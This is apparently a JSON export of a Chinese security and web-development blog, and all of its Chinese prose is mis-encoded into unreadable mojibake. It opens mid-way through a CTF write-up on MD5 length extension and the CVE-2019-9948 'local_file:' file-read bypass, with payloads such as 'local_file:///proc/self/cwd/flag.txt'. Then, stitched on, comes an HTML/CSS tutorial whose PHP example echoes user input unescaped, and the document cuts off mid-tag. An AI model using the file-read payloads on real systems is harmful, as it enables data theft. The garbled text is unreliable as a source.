å…¥ä»»æ„filenameå®ç°ä»»æ„æ–‡ä»¶è¯»å–\næ¡ä»¶ï¼š\n```\nå·²çŸ¥ä»»æ„ä¸€ä¸ªmd5($secret_key.filename)ï¼Œå¹¶ä¸”çŸ¥é“filenameçš„æ˜æ–‡ã€‚\nå·²çŸ¥secret_keyçš„é•¿åº¦ã€‚\nç”¨æˆ·å¯ä»¥æäº¤md5å€¼ã€‚\n```\nå·¥å…·ï¼š[HashPump/pythonæ¨¡å—:hashpumpy](https://github.com/bwall/HashPump)\nå‚è€ƒï¼š\n[hashæ‰©å±•é•¿åº¦æ”»å‡»åŠhashdumpä½¿ç”¨](https://www.cnblogs.com/gwind/p/8025130.html)\n[Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html#directory070830946390658543)\n[æµ…è°ˆMD5æ‰©å±•é•¿åº¦æ”»å‡»](https://github.com/mstxq17/cryptograph-of-web/blob/master/%E6%B5%85%E8%B0%88MD5%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.md)\n##### 2ã€Python 2.x - 2.7.16 urllib.fopenæ”¯æŒlocal_fileå¯¼è‡´LFI(CVE-2019-9948)\nå½“ä¸å­˜åœ¨åè®®çš„æ—¶å€™ï¼Œé»˜è®¤ä½¿ç”¨fileåè®®è¯»å–\nå¯ä»¥ä½¿ç”¨`local_file:`ç»•è¿‡ï¼Œä¾‹å¦‚`local_file:flag.txt`è·¯å¾„å°±æ˜¯ç›¸å¯¹è„šæœ¬çš„è·¯å¾„\n`local_file://`å°±å¿…é¡»ä½¿ç”¨ç»å¯¹è·¯å¾„(åè®®ä¸€èˆ¬éƒ½æ˜¯è¿™æ ·)\n`local-file:///proc/self/cwd/flag.txt`ä¹Ÿå¯ä»¥è¯»å–ï¼Œå› ä¸º`/proc/self/cwd/`ä»£è¡¨çš„æ˜¯å½“å‰è·¯å¾„\nå¦‚æœä½¿ç”¨` urllib2.urlopen(param)`å»åŒ…å«æ–‡ä»¶å°±å¿…é¡»åŠ ä¸Š`file`ï¼Œå¦åˆ™ä¼šæŠ¥`ValueError: unknown url type: /path/to/file`çš„é”™è¯¯\n#### è§£é¢˜æ–¹æ³•\n[De1CTF ssrf_me çš„ä¸‰ç§è§£æ³•](https://xz.aliyun.com/t/5927)\n[æµ…æDe1CTF 2019çš„ä¸¤é“web SSRF ME && ShellShellShell](https://xz.aliyun.com/t/6050)\n\n### SSRFmeã€2017-Hitconã€‘\n#### è§£é¢˜æ–¹æ³•\n[BUUCTF web writeup(äºŒ)](http://chenxiyuan.vip/2019/07/29/BUUCTF-web-writeup-%E4%BA%8C/)","tags":["Write-up"],"categories":["CTF"]},{"title":"Webå‰ç«¯ä¸‰å‰‘å®¢å­¦ä¹ ç¬”è®°","url":"/posts/38162.html","content":"\n![](https://img.jwt1399.top//img/20200824184057.png)\n\n## å‰è¨€\n\nä¸€ç›´æ²¡æœ‰ç³»ç»Ÿçš„å­¦ä¹ `HTML`,`CSS`,`JS`éƒ½æ˜¯ä¸œå­¦ä¸€ç‚¹ï¼Œè¥¿å­¦ä¸€ç‚¹ï¼Œæƒ³ç€æš‘å‡å¾—ç©ºï¼Œä¾¿ç³»ç»Ÿçš„å­¦ä¹ ä¸‹å§ï¼Œæ•…äºæ­¤è®°å½•ä¹‹ã€‚\n\n2020.2.25æ›´æ–°ï¼šç”±äºæœ¬ä¸“ä¸šå¼€è®¾äº†`ã€Šwebåº”ç”¨å¼€å‘ã€‹`è¯¾ï¼Œäºæ˜¯ä¹æœ¬æ–‡æ¡£å¾—åˆ°äº†è¿›ä¸€æ­¥å®Œå–„ã€‚\n\n## HTML\n\n>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼ˆHyperText Markup Languageï¼Œç®€ç§°ï¼šHTMLï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡å‡†æ ‡è®°è¯­è¨€ã€‚\næ‚¨å¯ä»¥ä½¿ç”¨ HTML æ¥å»ºç«‹è‡ªå·±çš„ WEB ç«™ç‚¹ï¼ŒHTML è¿è¡Œåœ¨æµè§ˆå™¨ä¸Šï¼Œç”±æµè§ˆå™¨æ¥è§£æã€‚\n\n### 1 ç¼–è¯‘å™¨\n\nä¸ªäººå–œæ¬¢VS Codeï¼Œç®€å•ï¼Œæ–¹ä¾¿ï¼Œæœ‰å¾ˆå¤šå¥½ç”¨çš„æ’ä»¶\nVS Codeï¼šhttps://code.visualstudio.com/\nä½¿ç”¨æ–¹æ³•ï¼š\næ–°å»ºä¸€ä¸ª`HTMLå­¦ä¹ `æ–‡ä»¶å¤¹åï¼Œç”¨VS Code æ‰“å¼€ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»º`index.html`æ–‡ä»¶ï¼Œè¾“å…¥`!`å†æŒ‰`Tab`é”®ï¼Œå¾—åˆ°æœ€åŸºç¡€çš„`HTML`\n\n### 2 åŸºç¡€\n\nHTML æœ€åŸºæœ¬å…ƒç´ \n![](https://i.loli.net/2019/08/10/avRMwQWzg8iPNS1.png)\n\n```html\n<!DOCTYPE html> å£°æ˜ä¸º HTML5 æ–‡æ¡£\n<html> å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ \n<head> å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ <meta charset=\"utf-8\"> å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8ã€‚\n<title> å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜\n<body> å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹\n```\nHTML æ³¨é‡Š`<!---->`\n```html\n<!--è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š-->\n\næ³¨é‡Šåœ¨æºç ä¸­æ‰èƒ½çœ‹åˆ°\n```\nHTML æ ‡é¢˜ `<h1> - <h6>`\n```html\n<h1>è¿™æ˜¯h1æ ‡é¢˜</h1>\n<h2>è¿™æ˜¯h2æ ‡é¢˜</h2>\n<h3>è¿™æ˜¯h3æ ‡é¢˜</h3>\n```\nHTML æ¢è¡Œ `<br/>`\n```html\n123<br/>456\n```\nHTML æ®µè½ `<p>`\n```html\n<p>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚</p>\n<p>è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚</p>\n```\nHTML é“¾æ¥ `<a>`\n```html\n<a href=\"https://jwt1399.top\">ç®€ç®€çš„åšå®¢</a>\n\n<a href=\"eg.html\" target=\"_blank\">æ‰“å¼€æœ¬åœ°é“¾æ¥</a>\ntarget=\"_blank\"ï¼šä»æ–°çš„çª—å£æ‰“å¼€\n```\n\nHTML å›¾åƒ `<img>`\n```html\n<img src=\"/images/logo.png\" width=\"304\" height=\"304\" />\n```\nä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š\n![](https://i.loli.net/2019/08/10/T2MYLZ15taOV8HE.png)\n![](https://i.loli.net/2019/08/10/1LHk3l6deXBZERV.png)\n\n### 3 æ ·å¼\n\nå¤–éƒ¨æ ·å¼è¡¨ï¼š(å­˜åœ¨äºhead)\n```html\n<link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\">\n```\nmystyle.css\n```css\nh1{\n    color:red;\n}\n```\nå†…éƒ¨æ ·å¼è¡¨ï¼š(å­˜åœ¨äºhead)\n```html\n<style type=\"text/css\">\n        p{\n        color:aqua\n        }\n    </style>\n```\nå†…è”æ ·å¼è¡¨ï¼š\n```html\n<a href=\"https://jwt1399.top\" style=\"color:aquamarine\">ç‚¹å‡»æˆ‘è·³è½¬åˆ°ç®€ç®€çš„åšå®¢</a>\n```\n### 4 é“¾æ¥\n\næ–‡æœ¬é“¾æ¥ï¼š(ç‚¹å‡»æ–‡å­—è·³è½¬åˆ°æŒ‡å®šé“¾æ¥)\n```html\n <a href=\"https://jwt1399.top\" >ç‚¹å‡»æˆ‘è·³è½¬åˆ°ç®€ç®€çš„åšå®¢</a>\n```\nå›¾ç‰‡é“¾æ¥ï¼š(ç‚¹å‡»å›¾ç‰‡è·³è½¬åˆ°æŒ‡å®šé“¾æ¥)\n```html\n<a href=\"https://jwt1399.top\" ><img src=\"logo.png\" width=\"100px\" height=\"100px\" alt=\"è¿™æ˜¯ä¸€ä¸ªlogo\"></a>\n<!--alt:å›¾ç‰‡åŠ è½½å¤±è´¥æ˜¾ç¤ºçš„æ–‡å­—-->\n```\næ–‡æ¡£å†…é“¾æ¥ï¼š(ä¾‹å¦‚è·³è½¬åˆ°é¡µé¢åº•éƒ¨)\n```html\n<a name=\"tips\">hello</a><!--æ¢è¡Œæ˜¯ä¸ºäº†æ›´å¥½æ¼”ç¤ºæ•ˆæœ-->\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n    <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\n<a href=\"#tips\">è·³è½¬åˆ°hello</a>\n```\nè¶…é“¾æ¥ä¼ªåè®®ï¼šé“¾æ¥åˆ°ç”µè¯ã€çŸ­ä¿¡ã€é‚®ä»¶\n```html\n<a href=\"tel:110\" >è¯·ç”µè¯è”ç³»è­¦å¯Ÿå”å”</a>\n<a href=\"sms:110\" >è¯·çŸ­ä¿¡è”ç³»è­¦å¯Ÿå”å”</a>\n<a href=\"mailTo:110@sina.com\" >è¯·Emailè”ç³»è­¦å¯Ÿå”å”</a>\n```\n### 5 è¡¨æ ¼\n\n![20190811100613243.png](https://i.loli.net/2020/03/10/X4dNvhWn9A83wTp.png)\n```html\n<!--borderï¼šè¾¹æ¡† cellpadding:è¡¨æ ¼å¤§å° cellspacing:å•å…ƒæ ¼é—´è·-->\n<table border=\"1\" cellpadding=\"20\" cellspacing=\"5\" bgcolor=\"#FF4B5D\" background=\"logo.png\">\n        <caption>ä¿¡æ¯è¡¨</caption> <!--å•å…ƒæ ¼æ ‡é¢˜-->\n        <tr>  <!--è¡Œ-->\n            <th>å­¦å·</th>  <!--è¡¨å¤´-->\n            <th>å§“å</th>\n            <th>å¹´é¾„</th>\n        </tr>\n        <tr>\n            <td>0001</td>  <!--åˆ—-->\n            <td>å°æ˜</td>\n            <td>18</td>\n        </tr>\n        <tr>\n            <td>0002</td>\n            <td>å°çº¢</td>\n            <td>18</td>\n        </tr>\n    </table>\n```\nä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š\n\n![](https://i.loli.net/2020/03/10/Ce4Hy683kdbwtJX.png)\n\n![](https://i.loli.net/2020/03/10/xcFOJ5QWKS1hRea.png)\n\n### 6 åˆ—è¡¨\n\n![](https://i.loli.net/2020/03/10/xC6DMGOvBW9J1H8.png)\næ— åºåˆ—è¡¨ï¼š\n\n```html\n<!--type:æ— åºæ ‡è¯†æ ·å¼ discå®å¿ƒåœ†,cirleç©ºå¿ƒåœ†,squareæ–¹å—-->\n    <ul type=\"square\">\n        <li>è‹¹æœ</li>\n        <li>è¥¿ç“œ</li>\n        <li>é¦™è•‰</li>\n    </ul>\n```\næœ‰åºåˆ—è¡¨ï¼š\n```html\n<!--type:æ’åºæ–¹å¼ 1,A,a,I,i,start-->\n    <ol type=\"1\">\n        <li>è‹¹æœ</li>\n        <li>è¥¿ç“œ</li>\n        <li>é¦™è•‰</li>\n    </ol>\n```\nåµŒå¥—åˆ—è¡¨ï¼š\n```html\n<!--æ— åºåµŒå¥—åˆ—è¡¨-->\n    <ul>\n        <li>åŠ¨ç‰©</li>\n        <ul>\n            <li>çŒ«</li>\n            <li>ç‹—</li>\n        </ul>\n        <li>æ¤ç‰©</li>\n        <ul>\n            <li>èŠ±</li>\n            <li>è‰</li>\n        </ul>        \n    </ul>\n <!--æœ‰åºåµŒå¥—åˆ—è¡¨-->\n    <ol>\n        <li>åŠ¨ç‰©</li>\n        <ol>\n            <li>çŒ«</li>\n            <li>ç‹—</li>\n        </ol>\n        <li>æ¤ç‰©</li>\n        <ol>\n            <li>èŠ±</li>\n            <li>è‰</li>\n        </ol>        \n    </ol>\n```\nè‡ªå®šä¹‰åˆ—è¡¨ï¼š\n```html\n<dl>\n        <dt>hello </dt>\n        <dd>è¿™æ˜¯ä½ å¥½çš„æ„æ€</dd>\n        <dt>Hi</dt>\n        <dd>è¿™ä¹Ÿæ˜¯ä½ å¥½çš„æ„æ€</dd>\n</dl>\n```\nä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š\n\n![](https://i.loli.net/2020/03/10/HWYSQ5b3rkL98ve.png)\n\n![](https://i.loli.net/2020/03/10/c6gaIzFnlZVh59Y.png)\n\n![](https://i.loli.net/2020/03/10/vCmjfSNwcLYBeWQ.png)\n\n![](https://i.loli.net/2020/03/10/ZCnI1QOztSqx9fh.png)\n\n### 7 å¸ƒå±€\n\n`<div> </div>`\n`<table> </table>`\n**divå¸ƒå±€ï¼š**\n\n```html\n<body>\n    \n<div id=\"container\">\n    <div id=\"heading\">å¤´éƒ¨</div>\n    <div id=\"content_menu\">å†…å®¹èœå•</div>\n    <div id=\"content_body\">å†…å®¹ä¸»ä½“</div>\n    <div id=\"footing\">åº•éƒ¨</div>\n</div>\n\n</body>\n```\n**divæ ·å¼è®¾è®¡ï¼š**\n\n```html\n<head>\n    <meta charset=\"UTF-8\">\n    <title>divå¸ƒå±€</title>\n    <style type=\"text/css\">\n    body{\n        margin: 0px;/*å»é™¤è¾¹æ¡†*/\n    }\n    #container{\n        width: 100%;\n        height:950px;\n        background-color: aqua;\n    } \n    #heading{\n        width: 100%;\n        height: 10%;\n        background-color: aquamarine;\n    }\n    #content_menu{\n        width: 30%;\n        height: 80%;\n        background-color: blueviolet;\n        float: left;  /*ä»å·¦å‘å³æ’åˆ—*/\n    } \n    #content_body{\n        width: 70%;\n        height: 80%;\n        background-color:chartreuse;\n        float: left;/*ä»å·¦å‘å³æ’åˆ—*/\n    }\n    #footing{\n        width: 100%;\n        height: 10%;\n        background-color: crimson;\n        clear: both;/*æ¸…é™¤ä»å·¦å‘å³æ’åˆ—*/\n    }\n    </style>\n</head>\n```\n**ä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š**\n\n![](https://i.loli.net/2020/03/10/PZWBALCrUObqJda.png)\n\n![](https://i.loli.net/2020/03/10/JGqAk35sxawSTH4.png)\n![](https://i.loli.net/2020/03/10/pEIPVJ2ksamGTjL.png)\n**tableå¸ƒå±€ï¼š**\n\n```html\n<body marginheight=\"0px\" marginwidth=\"0px\">  <!--å»é™¤è¾¹æ¡†-->\n    <table width=\"100%\" height=\"950px\" style=\"background-color:cyan\">\n        <tr><!--colspan=\"2\":åˆå¹¶å·¦å³ä¸¤ä¸ªå•å…ƒæ ¼-->\n            <td  colspan=\"3\" width=\"100%\" height=\"10%\" style=\"background-color: aquamarine\">å¤´éƒ¨</td>\n        </tr>\n        <tr>\n            <td width=\"30%\" height=\"50%\" style=\"background-color: blueviolet\">å†…å®¹èœå•\n            <ul>\n                <li>HTML</li>\n                <li>CSS</li>\n                <li>JS</li>\n            </ul>\n            </td>\n            <td width=\"70%\" height=\"50%\" style=\"background-color: chartreuse\">å†…å®¹ä¸»ä½“</td>           \n        </tr>\n        <tr>\n            <td colspan=\"3\" width=100% height=\"40%\" style=\"background-color: crimson\">åº•éƒ¨</td>\n        </tr>\n    </table>\n</body>\t\n```\n**ä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š**\n![](https://i.loli.net/2020/03/10/37FJBayRMq8bkWj.png)\n\n![](https://img.jwt1399.top//img/20200810120839.png)\n\n### 8 åŸºç¡€è¡¨å•\n\nå‚è€ƒï¼š[HTML-è¡¨å•ï¼ˆéå¸¸è¯¦ç»†ï¼‰](https://blog.csdn.net/nanjinzhu/article/details/82251110)\n\n\n>`<form> </form>`  è¡¨å•ç”¨äºæœé›†ä¸åŒç±»å‹çš„ç”¨æˆ·è¾“å…¥\n\n**è¯­æ³•ï¼š**\n\n```html\n<form name=\"è¡¨å•å\" method=\"get/post\" action=\"è¡¨å•å‘å¾€åœ°\">\n   <input type=\" \" name=\" \" />\n</form>\n```\n| **å±æ€§**      | **è¯´æ˜**                                        |\n| ------------- | ----------------------------------------------- |\n| **type**      | æŒ‡å®šå…ƒç´ çš„ç±»å‹ã€‚                                |\n| **name**      | æŒ‡å®šè¡¨å•å…ƒç´ çš„åç§°ã€‚                            |\n| **value**     | å…ƒç´ çš„åˆå§‹å€¼ã€‚type ä¸º radioæ—¶å¿…é¡»æŒ‡å®šä¸€ä¸ªå€¼ã€‚   |\n| **size**      | æŒ‡å®šè¡¨å•å…ƒç´ çš„åˆå§‹å®½åº¦ã€‚                        |\n| **maxlength** | typeä¸ºtext æˆ– password æ—¶ï¼Œè¾“å…¥çš„æœ€å¤§å­—ç¬¦æ•°ã€‚   |\n| **checked**   | typeä¸ºradioæˆ–checkboxæ—¶ï¼ŒæŒ‡å®šæŒ‰é’®æ˜¯å¦æ˜¯è¢«é€‰ä¸­ã€‚ |\n\n| typeåŸºç¡€å±æ€§å€¼ | æè¿°                                               |\n| :------------- | :------------------------------------------------- |\n| button         | å®šä¹‰å¯ç‚¹å‡»æŒ‰é’®ã€‚                                   |\n| checkbox       | å®šä¹‰å¤é€‰æ¡†ã€‚                                       |\n| file           | å®šä¹‰è¾“å…¥å­—æ®µå’Œ \"æµè§ˆ\"æŒ‰é’®ï¼Œä¾›æ–‡ä»¶ä¸Šä¼ ã€‚            |\n| hidden         | å®šä¹‰éšè—çš„è¾“å…¥å­—æ®µã€‚                               |\n| image          | å®šä¹‰å›¾åƒå½¢å¼çš„æäº¤æŒ‰é’®ã€‚                           |\n| password       | å®šä¹‰å¯†ç å­—æ®µã€‚è¯¥å­—æ®µä¸­çš„å­—ç¬¦è¢«æ©ç ã€‚               |\n| radio          | å®šä¹‰å•é€‰æŒ‰é’®ã€‚                                     |\n| reset          | å®šä¹‰é‡ç½®æŒ‰é’®ã€‚æ¸…é™¤è¡¨å•ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚               |\n| submit         | å®šä¹‰æäº¤æŒ‰é’®ã€‚æŠŠè¡¨å•æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ã€‚             |\n| text           | å®šä¹‰å•è¡Œçš„è¾“å…¥å­—æ®µï¼Œé»˜è®¤å®½åº¦ä¸º 20 ä¸ªå­—ç¬¦ã€‚         |\n| textarea       | å®šä¹‰å¤šè¡Œæ–‡æœ¬è¾“å…¥å­—æ®µ `<textarea>é»˜è®¤å€¼</textarea>` |\n| selectå’Œoption | å®šä¹‰ä¸‹æ‹‰åˆ—è¡¨æ¡†                                     |\n\næ–‡æœ¬ï¼š\n\n```html\n      ç”¨æˆ·åï¼š\n      <input type=\"text\">\n      å¯†ç :\n      <input type=\"password\">\n```\næäº¤ï¼š\n```html\n      <input type=\"submit\" value=\"æäº¤\">\n```\nå¤é€‰æ¡†:\n```html\n      ä½ å–œæ¬¢çš„æ°´æœæœ‰ï¼š\n      è‹¹æœ<input type=\"checkbox\">\n      è¥¿ç“œ<input type=\"checkbox\">\n      é¦™è•‰<input type=\"checkbox\">\n```\n å•é€‰æ¡†:\n ```html\n      æ€§åˆ«ï¼š\n      ç”·<input type=\"radio\" name=\"sex\">\n      å¥³<input type=\"radio\" name=\"sex\">\n ```\n  ä¸‹æ‹‰åˆ—è¡¨:\n  ```html\n      è¯·é€‰æ‹©ä¸€ä¸ªç½‘å€ï¼š\n      <select>\n          <option>jwt1399.top</option>\n          <option>www.baidu.com</option>\n          <option>www.google.com</option>\n      </select>\n  ```\næŒ‰é’®:\n```html\n      <input type=\"button\" value=\"æŒ‰é’®\">\n```\næ–‡æœ¬åŸŸ:(æ”¾åœ¨`<form>`ä¹‹å¤–)\n```html\n        <textarea cols=\"30\" rows=\"10\">è¯·åœ¨æ­¤å¡«å†™ä½ çš„ä¸ªäººçˆ±å¥½ï¼š</textarea>\n```\nä¸Šæ–¹æ ‡ç­¾æ¼”ç¤ºï¼š\n![](https://i.loli.net/2020/03/10/xLHoJmFgSP8Qsji.png)\n![](https://i.loli.net/2020/03/10/R4VSp5crEybLwDO.png)\n\n### 9 æ–°å¢è¡¨å•inputå…ƒç´ \n\nå‚è€ƒï¼š[HTML5æ–°å¢inputå…ƒç´ çš„ç±»å‹](https://blog.csdn.net/qq_35095321/article/details/62420732)\n\n| typeæ–°å±æ€§å€¼      | æè¿°                                                   |\n| ----------------- | ------------------------------------------------------ |\n| type=â€œtel\"        | è¾“å…¥ç”µè¯å·ç                                            |\n| type=\"email\"      | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºEmailç±»å‹                            |\n| type=\"url\"        | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºURLç±»å‹                              |\n| type=\"number\"     | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºæ•°å­—ç±»å‹                             |\n| type=\"range\"      | äº§ç”Ÿä¸€ä¸ªæ»‘åŠ¨æ¡çš„è¡¨å•                                   |\n| type=\"searchâ€œ     | äº§ç”Ÿä¸€ä¸ªæœç´¢æ„ä¹‰çš„è¡¨å•                                 |\n| type=\"color\"      | ç”Ÿæˆä¸€ä¸ªé¢œè‰²é€‰æ‹©è¡¨å•                                   |\n| type=\"time\"       | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºæ—¶é—´ç±»å‹                             |\n| type=\"date\"       | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºæ—¥æœŸç±»å‹                             |\n| type=\"month\"      | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºæœˆç±»å‹                               |\n| type=\"week\"       | é™åˆ¶ç”¨æˆ·è¾“å…¥å¿…é¡»ä¸ºå‘¨ç±»å‹                               |\n| `<label>`è¡¨å•æ§ä»¶ | æ–¹ä¾¿é¼ æ ‡ç‚¹å‡»ä½¿ç”¨ï¼Œlabel å…ƒç´ å†…ç‚¹å‡»æ–‡æœ¬ï¼Œå°±ä¼šè§¦å‘æ­¤æ§ä»¶ |\n`<label>`ç”¨æ³•ï¼š`<label for=\"æ§ä»¶id\"></label>`\n\n```html\n<form>\n      <input type=\"checkbox\" name=\"user_ball\"  id=\"basketball\">\n\t  <label for=\"basketball\">ç¯®çƒ</label>\n     \n      <input type=\"checkbox\" name=\"user_ball\"  id=\"football\" checked>\n\t  <label for=\"football\">è¶³çƒ</label>\n      \n      <input type=\"checkbox\" name=\"user_ball\"  id=\"pingpangball\">\n\t  <label for=\"pingpangball\">ä¹’ä¹“çƒ</label>\n</form>\n```\n\n![](https://i.loli.net/2020/03/20/vRwaSbO39zyDVG7.png)\n\n### 10 è¡¨å•ä¸PHPäº¤äº’\n\nGETæ–¹å¼äº¤äº’ï¼š\né¦–å…ˆå»ºç«‹ä¸€ä¸ªè¡¨å•ï¼š\n\n```html\n <!-- action:æäº¤çš„åœ°å€,method:æäº¤æ–¹å¼-->\n  <form action=\"http://127.0.0.1/eg.php\" method=\"GET\">\n      ç”¨æˆ·åï¼š<input type=\"text\" name=\"id\">\n      å¯†  ç : <input type=\"password\" name=\"password\">\n      <!--æäº¤-->\n      <input type=\"submit\" value=\"æäº¤\">\n      <br/>      \n  </form>\n```\nè¡¨å•äº¤äº’çš„æ–‡ä»¶ï¼šeg.php\n```php\n<?php\nheader(\"Content-type: text/html; charset=utf-8\");//é˜²æ­¢ä¸­æ–‡ä¹±ç \necho \"ç”¨æˆ·å:\".$_GET['id'].\"<br>å¯†ç :\".$_GET['password'];//è¾“å‡ºGETæ–¹å¼ä¼ è¿›çš„idå’Œpassword\n?>\n```\nphpæ–‡ä»¶æ”¾åœ¨æœ¬åœ°æœåŠ¡å™¨çš„`www`ç›®å½•ä¸‹æ‰èƒ½è¿è¡Œ\n![](https://i.loli.net/2020/03/10/jaLPqKExz5Dly36.png)\næŸ¥çœ‹æˆ‘ä»¬å†™å¥½çš„è¡¨å•\n![](https://i.loli.net/2020/03/10/v7HUlu9IzAmrObw.png)\n![](https://i.loli.net/2020/03/10/l36Se52KDABLjH1.png)\nè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç‚¹å‡»æäº¤ï¼Œå‘ç°å·²ç»è¢«æäº¤åˆ°äº†ç›®æ ‡åœ°å€,idå’Œpasswordä¼šç›´æ¥æ˜¾ç¤ºåœ¨`URLæ¡†`ä¸­ï¼Œ`POSTæ–¹å¼`åˆ™ä¸ä¼š\n![](https://i.loli.net/2020/03/10/PKcsLb3plGW8orx.png)\nPOSTæ–¹å¼äº¤äº’ï¼š\né¦–å…ˆå»ºç«‹ä¸€ä¸ªè¡¨å•ï¼š\n\n```html\n <!-- action:æäº¤çš„åœ°å€,method:æäº¤æ–¹å¼-->\n  <form action=\"http://127.0.0.1/eg.php\" method=\"POST\">\n      ç”¨æˆ·åï¼š<input type=\"text\" name=\"id\">\n      å¯†  ç : <input type=\"password\" name=\"password\">\n      <!--æäº¤-->\n      <input type=\"submit\" value=\"æäº¤\">\n      <br/>      \n  </form>\n```\nè¡¨å•äº¤äº’çš„æ–‡ä»¶ï¼šeg.php\n```php\n<?php\nheader(\"Content-type: text/html; charset=utf-8\");//é˜²æ­¢ä¸­æ–‡ä¹±ç \necho \"ç”¨æˆ·å:\".$_POST['id'].\"<br>å¯†ç :\".$_POST['password'];//è¾“å‡ºPOSTæ–¹å¼ä¼ è¿›çš„idå’Œpassword\n?>\n```\næŸ¥çœ‹æˆ‘ä»¬å†™å¥½çš„è¡¨å•\n![](https://i.loli.net/2020/03/10/YBvVcObAUoQLfp7.png)\nè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç‚¹å‡»æäº¤ï¼Œå‘ç°å·²ç»è¢«æäº¤åˆ°äº†ç›®æ ‡åœ°å€\n![](https://i.loli.net/2020/03/10/6uLiw35Eg1Yfvx9.png)\n\n###  11 æ¡†æ¶\n\næ¡†æ¶ï¼š`<frame>` \næ¡†æ¶é›†ï¼š`<frameset>`\nå†…è”æ¡†æ¶ï¼š`<iframe>`\nä¸æ”¾åœ¨`<body>`ä¸­\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>æ¡†æ¶</title>  \n</head>\n<!--cols:çºµå‘ rows:æ¨ªå‘-->\n    <frameset rows=\"20%,50%,30%\">\n        <frame src=\"frame1.html\">\n        <frame src=\"frame2.html\">\n        <frame src=\"frame3.html\">\n    </frameset>\n</html>\n```\nframe1.html(frame2å’Œ3ä¸€æ ·åªæ˜¯bgcoloré¢œè‰²æ”¹ä¸€å“ˆ)\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"blue\">\n</body>\n</html>\n```\nä¸Šæ–¹è¿è¡Œç»“æœï¼š\n![](https://i.loli.net/2020/03/10/bW4dCcAZzrVERP8.png)\nå†…è”æ¡†æ¶ï¼š\nindex.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>æ¡†æ¶</title>  \n</head>\n    <br>\n    <iframe src=\"frame3.html\" frameborder=\"0\" width=\"800px\" height=\"800px\"></iframe>\n</html>\n```\nframe1.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"aquamarine\">\n   Frame1<br>\n   <!--targetçš„4ä¸ªå‚æ•°ï¼š_self:è‡ªå·±æœ¬èº«æ‰“å¼€æ‰“å¼€ï¼Œ_blank:æ–°çª—å£æ‰“å¼€ï¼Œ_parentï¼šçˆ¶çª—å£æ‰“å¼€ï¼Œ_topï¼šé¡¶çº§é¡µé¢æ‰“å¼€-->\n   <a href=\"https://jwt1399.top\" target=\"_self\">ç®€ç®€çš„åšå®¢åœ¨æœ¬èº«æ‰“å¼€</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_blank\">ç®€ç®€çš„åšå®¢åœ¨æ–°çª—å£æ‰“å¼€</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_parent\">ç®€ç®€çš„åšå®¢å†çˆ¶çª—å£æ‰“å¼€</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_top\">ç®€ç®€çš„åšå®¢åœ¨é¡¶çº§é¡µé¢(indexé¡µé¢)æ‰“å¼€</a><br>\n</body>\n</html>\n\n```\nframe2.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"red\">\n    Frame2\n    <br>\n    <iframe src=\"frame1.html\" frameborder=\"0\" width=\"400px\" height=\"400px\"></iframe>\n</body>\n</html>\n```\nframe3.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>   \n</head>\n<body bgcolor=\"aqua\" >\n    Frame3\n    <br>\n    <iframe src=\"frame2.html\" frameborder=\"0\" width=\"600px\" 